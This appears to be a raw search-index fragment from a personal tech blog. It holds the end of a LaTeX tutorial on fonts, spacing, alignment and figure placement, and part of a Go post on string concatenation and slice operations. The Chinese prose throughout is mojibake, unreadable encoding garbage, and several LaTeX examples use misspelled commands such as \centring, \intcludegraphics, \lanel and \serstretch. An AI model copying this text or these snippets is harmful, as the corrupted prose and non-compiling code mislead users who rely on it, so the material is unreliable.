&lt;p&gt;åˆæ¬¡ä½¿ç”¨ç›®å½•ã€æˆ–ç« èŠ‚å›¾è¡¨ç­‰å±‚æ¬¡ç»“æ„å‘ç”Ÿå˜åŒ–æ—¶ï¼Œéœ€è¦æ‰§è¡Œä¸¤æ¬¡ç¼–è¯‘å‘½ä»¤ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨&#34;&gt;ä½¿ç”¨&lt;/h3&gt;
&lt;h4 id=&#34;å­—ç¬¦&#34;&gt;å­—ç¬¦&lt;/h4&gt;
&lt;p&gt;è¾“å…¥æ–‡å­—å­—ç¬¦å¯åˆ†ä¸ºï¼šæ™®é€šå­—ç¬¦ã€æ§åˆ¶ç¬¦ã€ç‰¹æ®Šå­—ç¬¦ã€é¢„å®šä¹‰å­—ç¬¦ä¸²ã€æ³¨éŸ³ç¬¦å·ç­‰ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ™®é€šå­—ç¬¦&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ§åˆ¶ç¬¦&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#$%^&amp;amp;_{}&lt;/code&gt;ç­‰æ˜¯ç‰¹æ®Šæ§åˆ¶ç¬¦ï¼Œä½¿ç”¨æ—¶éœ€è¦åŠ ä¸Š&lt;code&gt;\&lt;/code&gt;ï¼Œè€Œ&lt;code&gt;\&lt;/code&gt;æœ¬èº«è¦ä½¿ç”¨&lt;code&gt;\textbackslash&lt;/code&gt;æ¥è¾“å…¥ï¼Œå› ä¸º&lt;code&gt;\\&lt;/code&gt;æ˜¯æ¢è¡ŒæŒ‡ä»¤ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç‰¹æ®Šå­—ç¬¦&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é¢„å®šä¹‰å­—ç¬¦&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684003400.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;æ³¨éŸ³ç¬¦å·&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684013268.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;å­—ä½“è®¾ç½®&#34;&gt;å­—ä½“è®¾ç½®&lt;/h4&gt;
&lt;p&gt;æ‹‰ä¸æ–‡å­—ä½“ä¸»è¦æœ‰ä¸‰å¤§ç±»ï¼šè¡¬çº¿å­—ä½“ã€æ— è¡¬çº¿å­—ä½“ã€ç­‰å®½å­—ä½“ã€‚è¡¬çº¿å­—ä½“ç”»ç¬”çš„è¾¹ç¼˜éƒ¨åˆ†æœ‰äº›ä¿®é¥°ï¼Œç±»ä¼¼äºä¸­æ–‡çš„å®‹ä½“ã€ä»¿å®‹ç­‰ï¼›æ— è¡¬çº¿å­—ä½“çš„ç”»ç¬”æ˜¯å¹³æ»‘çš„ï¼Œç±»ä¼¼äºä¸­æ–‡çš„é»‘ä½“ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;% é»˜è®¤ ç½—é©¬å­—ä½“
Hello world
% ç²—ä½“
\textbf{Hello world}
% ä¸‹åˆ’çº¿
\underline{Hello world}
% æ–œä½“
\textit{Hello world}
% å­—å·
{\tiny Hello world}
{\scriptsize Hello world}
{\footnotesize Hello world}
{\small Hello world}
{\normalsize Hello world}
{\large Hello world}
{\Large Hello world}
{\LARGE Hello world}
{\huge Hello world}
{\Huge Hello world}

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;æ¢è¡Œå’Œæ¢é¡µç¬¦&#34;&gt;æ¢è¡Œå’Œæ¢é¡µç¬¦&lt;/h4&gt;
&lt;p&gt;æ¢è¡Œéœ€è¦ä¸¤ä¸ªå›è½¦æ¢è¡Œï¼Œä¸­é—´å¤¹ä¸€ä¸ªç©ºè¡Œã€‚æˆ–è€…åœ¨å¥å°¾æ·»åŠ &lt;code&gt;\par&lt;/code&gt;ã€&lt;code&gt;\newline&lt;/code&gt;ã€&lt;code&gt;\\&lt;/code&gt;ä¹Ÿå¯ä»¥å®ç°æ¢è¡Œï¼Œä½†&lt;code&gt;newline&lt;/code&gt;å’Œ&lt;code&gt;\\&lt;/code&gt;ä¸èƒ½å½¢æˆç¼©è¿›ã€‚&lt;/p&gt;
&lt;p&gt;æ¢é¡µç›´æ¥æ·»åŠ &lt;code&gt;\newpage&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;é•¿åº¦&#34;&gt;é•¿åº¦&lt;/h4&gt;
&lt;p&gt;Latexçš„é•¿åº¦å•ä½æœ‰ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684025879.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;Latexä¸ºæ’ç‰ˆå¯¹è±¡å’Œå°ºå¯¸å’Œä½ç½®å®šä¹‰äº†ä¸€ç³»åˆ—å®å˜é‡ï¼Œä»¥ä¾¿åœ¨æ’ç‰ˆæ—¶é‡ç”¨ã€‚&lt;/mark&gt;&lt;/p&gt;
&lt;h4 id=&#34;å¯¹é½æ–¹å¼&#34;&gt;å¯¹é½æ–¹å¼&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å±…ä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{center}
\end{center}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å·¦å¯¹é½&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{flushleft}
\end{flushleft}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å³å¯¹é½&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{flushright}
\end{flushright}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¼©è¿›å’Œæ®µé—´è·&lt;/p&gt;
&lt;p&gt;Latexæ­£æ–‡ç¬¬ä¸€ä¸ªæ®µè½ç¼ºçœä¸è¿›è¡Œé¦–è¡Œç¼©è¿›ï¼Œå¯ä»¥è°ƒç”¨&lt;code&gt;identfirst&lt;/code&gt;å®åŒ…ä½¿å¾—ç¬¬ä¸€æ®µä¹Ÿç¼©è¿›é¦–è¡Œã€‚æ®µè½é¦–è¡Œç¼©è¿›çš„ä¸¾ä¾‹å¯ä»¥ç”¨&lt;code&gt;\parindent&lt;/code&gt;å˜é‡æ¥æ§åˆ¶ï¼Œæ®µè½ä¹‹é—´çš„ä¸¾ä¾‹å¯ä»¥ç”¨&lt;code&gt;\parskip&lt;/code&gt;å˜é‡æ¥æ§åˆ¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\usepackage{identfirst}
...
\setlength{\parindent}{2em}
\addtolength{\parskip}{3pt}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Latexç¼ºçœè¡Œé—´è·ä¸ºå•å€è¡Œè·ã€‚å¯ä»¥ä½¿ç”¨&lt;code&gt;\linespread&lt;/code&gt;å‘½ä»¤æ¥æ§åˆ¶é—´è·&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\linespread{1.3} % 1.5å€è¡Œè·
\linespread{1.6} % 2å€è¡Œè·
% ä¼šæŠŠæ­£æ–‡å’Œç›®å½•è„šæ³¨å›¾è¡¨æ ‡é¢˜ç­‰è¡Œè·ä¹Ÿè¯¥äº†ï¼Œå¦‚æœåªæ”¹æ­£æ–‡ï¼Œéœ€è¦ä½¿ç”¨å®åŒ…
\usepackage{setspace}
% è¯¥å®åŒ…æä¾›äº†å‡ ä¸ªç¯å¢ƒè®¾ç½®å±€éƒ¨è¡Œè·
\singlespacing
\onehalfspacing
\doublespacing
\serstretch{1.25} % ä»»æ„è¡Œè·

\begin{doublespacing}
... \\ 
...
\end{doublespacing}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;æ‘˜å½•å’Œè„šæ³¨å’Œè¾¹æ³¨&#34;&gt;æ‘˜å½•å’Œè„šæ³¨å’Œè¾¹æ³¨&lt;/h4&gt;
&lt;p&gt;æ‘˜å½•ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684054841.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è„šæ³¨ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684062165.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¾¹æ³¨ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684073387.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;åˆ—è¡¨&#34;&gt;åˆ—è¡¨&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684080512.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¸Šè¿°åˆ—è¡¨çš„ç¼ºçœè¡Œé—´è·è¾ƒå¤§ï¼Œå¦‚è¦èŠ‚çœç©ºé—´ï¼Œå¯ä»¥è€ƒè™‘Bernd Schandl 9çš„paralist å®åŒ…ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—å‹ç¼©åˆ—è¡¨å’Œè¡Œé—´åˆ—è¡¨ç¯å¢ƒã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684086758.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;11&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684093673.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ç›’å­&#34;&gt;ç›’å­&lt;/h4&gt;
&lt;p&gt;å¾…è¡¥å……&lt;/p&gt;
&lt;h4 id=&#34;æ’å…¥å›¾ç‰‡&#34;&gt;æ’å…¥å›¾ç‰‡&lt;/h4&gt;
&lt;p&gt;Latexæ”¯æŒä½¿ç”¨ç‚¹é˜µå›¾ç‰‡æ ¼å¼JPEGå’ŒPNGï¼Œä¹Ÿæ”¯æŒçŸ¢é‡æ ¼å¼EPSå’ŒPDFï¼Œå¯¹äºç¤ºæ„å›¾åº”è¯¥é¦–é€‰çŸ¢é‡æ ¼å¼ï¼ŒåŒ…å«å¤§è‡ªç„¶è‡ªç„¶å½©è‰²çš„å›¾åƒåº”è¯¥é€‰JPEGï¼Œäººå·¥ç‚¹é˜µå›¾åº”è¯¥é€‰PNGã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨åŒ…&lt;code&gt;\usepackage{graphicx}&lt;/code&gt;ï¼Œç„¶åæŒ‡å®šå›¾ç‰‡è·¯å¾„&lt;code&gt;\graphicspath{{./images/}}&lt;/code&gt;ï¼Œæœ€ååœ¨æƒ³è¦æ’å…¥å›¾ç‰‡çš„åœ°æ–¹ä½¿ç”¨&lt;code&gt;\includegraphics{xxxx.xx}&lt;/code&gt;ï¼Œå¦‚æœè¦è®¾å®šå›¾ç‰‡çš„æ ¼å¼ï¼Œå¯ä½¿ç”¨&lt;code&gt;includegraphics[scale=1.5, angle=45, width=3cm, height=4cm]{xxxx.xx}&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;figureç¯å¢ƒ&#34;&gt;figureç¯å¢ƒ&lt;/h5&gt;
&lt;p&gt;å¯¹å›¾ç‰‡çš„ä½ç½®è¿›è¡Œè°ƒæ•´å¯ä»¥ä½¿ç”¨figureç¯å¢ƒï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centring
\includepgraphics{xxx.jpg}
\caption{æœ‰å›¾æœ‰çœŸç›¸} % è®¾ç½®æ’å›¾æ ‡é¢˜
\label{fig:myphoto} % æ”¾åœ¨æ ‡é¢˜åï¼Œè¡¨ç¤ºè¯¥æ’å›¾çš„å¼•ç”¨
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;htbpé€‰é¡¹ç”¨æ¥æŒ‡å®šæ’å›¾çš„ç†æƒ³ä½ç½®ï¼Œè¿™å‡ ä¸ªå­—æ¯åˆ†åˆ«ä»£è¡¨hereè¿™é‡Œã€topé¡µé¡¶ã€bottomé¡µå°¾ã€float pageæµ®åŠ¨é¡µ(ä¸“é—¨æ”¾æµ®åŠ¨ç¯å¢ƒçš„å•ç‹¬é¡µé¢)&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™å‡ ä¸ªå­—æ¯çš„ä»»æ„ç»„åˆï¼Œä½†ä¸å»ºè®®å•ç‹¬ä½¿ç”¨hï¼Œå› ä¸ºLatexçš„æ’ç‰ˆç®—æ³•æ˜¯å®Œç¾çš„ã€‚&lt;/p&gt;
&lt;h5 id=&#34;æ’å…¥å¤šå¹…å›¾&#34;&gt;æ’å…¥å¤šå¹…å›¾&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å¹¶æ’ï¼Œå…±äº«æ ‡é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\includegraphics{left.pdf}
\includegraphics{right.pdf}
\caption{xxx}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¹¶æ’æ‘†æ”¾ï¼Œå„æœ‰æ ‡é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\begin{minipage}{60pt}
	\includegraphics{left.pdf}
	\caption{left}
\end{minipage}
\hspace{10pt}
\begin{minipage}{60pt}
	\includegraphics{right.pdf}
	\caption{right}
\end{minipage}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¹¶æ’æ‘†æ”¾ï¼Œå„æœ‰æ ‡é¢˜ï¼Œå„æœ‰å­æ ‡é¢˜&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\subfloat[subleft title]{
	\label{fig:subfig_a}
	\intcludegraphics{left.pdf}
}
\hspace{10pt}
\subfloat[subright title]{
	\label{fig:subfig_b}
	\intcludegraphics{right.pdf}
}
\caption{title}
\lanel{fig:subfig}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;12&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684111509.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æ”¹è¿›&lt;/p&gt;
&lt;p&gt;subfloatç¼ºå°‘å®½åº¦å‚æ•°ï¼Œè€Œå­æ ‡é¢˜æœ€å¤šå’Œå­å›¾ä¸€æ ·å®½ï¼Œå¤ªé•¿ä¼šå‡ºç°æŠ˜è¡Œï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥åœ¨&lt;code&gt;\subfloat&lt;/code&gt;é‡Œå†åµŒå¥—ä¸ªminipageï¼Œå› ä¸ºåè€…æ˜¯æœ‰å®½åº¦è®¾ç½®ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{figure}[htbp]
\centering
\subfloat[subleft title]{
	\label{fig:subfig_a}
	\begin{minipage}[t]{60pt}
		\centering
		\intcludegraphics{left.pdf}
	\end{minipage}
}
\hspace{10pt}
\subfloat[subright title]{
	\label{fig:subfig_b}
	\begin{minipage}[t]{60pt}
		\centering
		\intcludegraphics{right.pdf}
	\end{minipage}
}
\caption{title}
\lanel{fig:subfig}
\end{figure}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ•°å­¦&#34;&gt;æ•°å­¦&lt;/h3&gt;
&lt;p&gt;æ·»åŠ å®åŒ…&lt;code&gt;\usepackage{amsmath}&lt;/code&gt;ï¼Œå…¬å¼åˆ†ä¸ºè¡Œé—´æ¨¡å¼å’Œç‹¬ç«‹æ¨¡å¼ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;13&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684123062.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä»–çš„æ•°å­¦ç¬¦å·å‚è€ƒï¼š&lt;/p&gt;
&lt;h3 id=&#34;å†™ä½œæ¨¡æ¿&#34;&gt;å†™ä½œæ¨¡æ¿&lt;/h3&gt;
&lt;p&gt;ä¸€äº›Latexæ¨¡æ¿çš„ç½‘ç«™ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.latextemplates.com/
https://github.com/MartinThoma/LaTeX-examples
http://uk.tug.org/training/thesis/
https://www.overleaf.com/
https://www.latexstudio.net/
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;æ–‡ä»¶æ‰©å±•å&#34;&gt;æ–‡ä»¶æ‰©å±•å&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;14&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684131775.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ä¸­æ–‡é—®é¢˜&#34;&gt;ä¸­æ–‡é—®é¢˜&lt;/h3&gt;
&lt;p&gt;æ·»åŠ å®åŒ…&lt;code&gt;\usepackage{xeCJK}&lt;/code&gt;ï¼Œå¹¶åˆ‡æ¢åˆ°XeLatexç¼–è¯‘å™¨(ä»¥TeXstudioä¸ºä¾‹)ï¼Œå°±å¯ä»¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡äº†ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;15&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684138394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">Latex</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-gao-xing-neng/"" data-c="
          &lt;h3 id=&#34;å¸¸è§æ‹¼æ¥æ–¹å¼&#34;&gt;å¸¸è§æ‹¼æ¥æ–¹å¼&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;+&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func plusConcat(n int, str string) string {
    s := &amp;quot;&amp;quot;
    for i := 0; i &amp;lt; n; i++ {
        s += str
    }
    return s
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;strings.Builder&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func builderConcat(n int, str string) string {
    var builder strings.Builder
    for i := 0; i &amp;lt; n; i++ {
        builder.WriteString(str)
    }
    return builder.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;bytes.Buffer&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func bufferConcat(n int, s string) string {
    buf := new(bytes.Buffer)
    for i := 0; i &amp;lt; n; i++ {
        buf.WriteString(s)
    }
    return buf.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;[]byte&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func byteConcat(n int, str string) string {
    buf := make([]byte, 0)
    for i := 0; i &amp;lt; n; i++ {
        buf = append(buf, str...)
    }
    return string(buf)
}
// å¦‚æœçŸ¥é“é•¿åº¦ï¼Œå¯ä»¥æå‰é¢„åˆ†é…åˆ‡ç‰‡çš„å®¹é‡
func preByteConcat(n int, str string) string {
    buf := make([]byte, 0, n*len(str))
    for i := 0; i &amp;lt; n; i++ {
        buf = append(buf, str...)
    }
    return string(buf)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;+&lt;/code&gt;è¿™ç§æ–¹å¼çš„æ•ˆç‡æ˜¯æœ€ä½çš„ï¼Œæ¶ˆè€—çš„æ—¶é—´å’Œå†…å­˜å‡ ä¹æ˜¯å…¶ä»–æ–¹æ³•çš„1000å€ï¼Œå…¶ä»–å‡ ç§çš„æ€§èƒ½æ¶ˆè€—ç›¸è¿‘ï¼Œæœ€å¥½çš„æ˜¯æœ€åä¸€ç§ï¼Œå› ä¸ºåœ¨æ‹¼æ¥çš„è¿‡ç¨‹ï¼Œä¸éœ€è¦è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹·è´ï¼Œä¸éœ€è¦åˆ†é…æ–°çš„å†…å­˜ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ€»å’Œæ˜“ç”¨æ€§å’Œæ€§èƒ½ï¼Œä¸€èˆ¬æ¨èä½¿ç”¨&lt;code&gt;strings.Builder&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;ä¹Ÿæä¾›äº†é¢„åˆ†é…å†…å­˜çš„æ–¹å¼Growï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func builderConcat(n int, str string) string {
	var builder strings.Builder
	builder.Grow(n * len(str))
	for i := 0; i &amp;lt; n; i++ {
		builder.WriteString(str)
	}
	return builder.String()
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åŸç†&#34;&gt;åŸç†&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt;æ–¹å¼æ…¢åŸå› æ˜¯å› ä¸ºgoè¯­è¨€ä¸­å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜ç±»å‹ï¼Œå ç”¨å†…å­˜å¤§å°æ˜¯å›ºå®šçš„ï¼Œå½“&lt;code&gt;+&lt;/code&gt;æ‹¼æ¥2ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦å¼€è¾Ÿä¸€æ®µæ–°çš„ç©ºé—´ï¼Œå¤§å°æ˜¯åŸæ¥ä¸¤ä¸ªå­—ç¬¦ä¸²å¤§å°ä¹‹å’Œã€‚é‚£è¿›è¡Œç¬¬ä¸‰æ¬¡æ‹¼æ¥æ—¶éœ€è¦å†å¼€è¾Ÿæ–°çš„ç©ºé—´ï¼Œå› æ­¤éœ€è¦çš„æ—¶é—´å’Œå†…å­˜å¼€é”€è¾ƒå¤§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;ï¼Œ&lt;code&gt;bytes.Buffer&lt;/code&gt;å’Œåˆ‡ç‰‡çš„å†…å­˜æ˜¯ä»¥å€æ•°ç”³è¯·çš„ã€‚ä¾‹å¦‚éœ€è¦ä¸€ä¸ª10byteçš„å†…å­˜æ—¶ï¼Œå½“bufferä¸å¤Ÿæ—¶ï¼Œä¼šè‡ªåŠ¨ç”³è¯·å¤§å°ä¸º16byteçš„å†…å­˜ï¼Œå†æ¬¡ç”³è¯·æ—¶ä¼šç”³è¯·32byteï¼Œç„¶å64byteï¼Œè¿™æ ·2çš„å€æ•°å¢é•¿ï¼Œä½†å½“è¶…è¿‡2048byteæ—¶ç”³è¯·ç­–ç•¥ä¼šè°ƒæ•´ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;16 32 64 128 256 512 1024 2048 2688 3456 4864 6144 8192 10240 13568 18432 24576 32768 40960 57344 73728 98304 122880
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;strings.Builder&lt;/code&gt;å’Œ&lt;code&gt;bytes.Buffer&lt;/code&gt;åº•å±‚éƒ½æ˜¯&lt;code&gt;[]byte&lt;/code&gt;æ•°ç»„ï¼Œä½†å‰è€…æ¯”åè€…æ€§èƒ½ç•¥å¿«10%ï¼Œä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„åŸå› æ˜¯&lt;code&gt;byte.Buffer&lt;/code&gt;è½¬åŒ–ä¸ºå­—ç¬¦ä¸²æ—¶é‡æ–°ç”³è¯·äº†ä¸€å—ç©ºé—´ï¼Œå­˜æ”¾ç”Ÿæˆçš„å­—ç¬¦ä¸²å˜é‡ï¼Œè€Œ&lt;code&gt;strings.Builder&lt;/code&gt;ç›´æ¥å°†åº•å±‚çš„&lt;code&gt;[]byte&lt;/code&gt;ç›´æ¥è½¬æ¢æˆäº†å­—ç¬¦ä¸²ç±»å‹è¿”å›äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åˆ‡ç‰‡æ€§èƒ½&#34;&gt;åˆ‡ç‰‡æ€§èƒ½&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func make([]T, len, cap) []T
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;lenæ˜¯æŒ‡å®šé•¿åº¦ï¼Œå³åˆå§‹åŒ–åˆ‡ç‰‡æ—¶æ‹¥æœ‰å¤šå°‘ä¸ªå…ƒç´ ï¼›&lt;/p&gt;
&lt;p&gt;capæ˜¯æŒ‡å®šå®¹é‡ï¼Œå³ç”³è¯·çš„å†…å­˜çš„å¤§å°ï¼Œé»˜è®¤ç­‰äºlenã€‚&lt;/p&gt;
&lt;p&gt;å½“åˆ‡ç‰‡å®¹çº³çš„å…ƒç´ çš„ä¸ªæ•°è¶…è¿‡capä¹‹åå°±ä¼šé‡æ–°åˆ†é…å†…å­˜ï¼Œå¹¶å°†å½“å‰åˆ‡ç‰‡æ‰€æœ‰å…ƒç´ æ‹·è´åˆ°æ–°çš„å†…å­˜ç©ºé—´ä¸Šã€‚å› æ­¤ä¸ºäº†å‡å°‘å†…å­˜çš„æ‹·è´æ¬¡æ•°ï¼Œå®¹é‡åœ¨æ¯”è¾ƒå°çš„æ—¶å€™ï¼Œä¸€èˆ¬ä»¥2çš„å€æ•°æ‰©å¤§çš„ï¼Œä¾‹å¦‚2, 4, 8, ..., å½“è¾¾åˆ°2048æ—¶ï¼Œä¼šé‡‡å–æ–°çš„ç­–ç•¥ï¼Œé¿å…ç”³è¯·å†…å­˜è¿‡å¤§æµªè´¹ç©ºé—´ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åˆ‡ç‰‡æ“ä½œåŠæ€§èƒ½&#34;&gt;åˆ‡ç‰‡æ“ä½œåŠæ€§èƒ½&lt;/h3&gt;
&lt;h4 id=&#34;copy&#34;&gt;copy&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;b = make([]T, len(a))
copy(b, a)
// b = append([]T(nil), a...)
// b = append(a[:0:0], a...)
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;append&#34;&gt;append&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;a = append(a, b...)
// å½“appendåçš„é•¿åº¦å¤§äºcapæ—¶ï¼Œä¼šåˆ†é…ä¸€å—æ›´å¤§çš„åŒºåŸŸæ¥å®¹çº³æ–°çš„åº•å±‚æ•°ç»„
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;delete&#34;&gt;delete&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åˆ é™¤a[i]
a = append(a[:i], a[i+1:]...)
a = a[:i+copy(a[i:], a[i+1:])]
// O(n)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;deletegc&#34;&gt;delete(gc)&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åˆ é™¤a[i]
if i &amp;lt; len(a)-1 {
    copy(a[i:], a[i+1:])
}
a[len(a)-1] = nil
a = a[:len(a)-1]
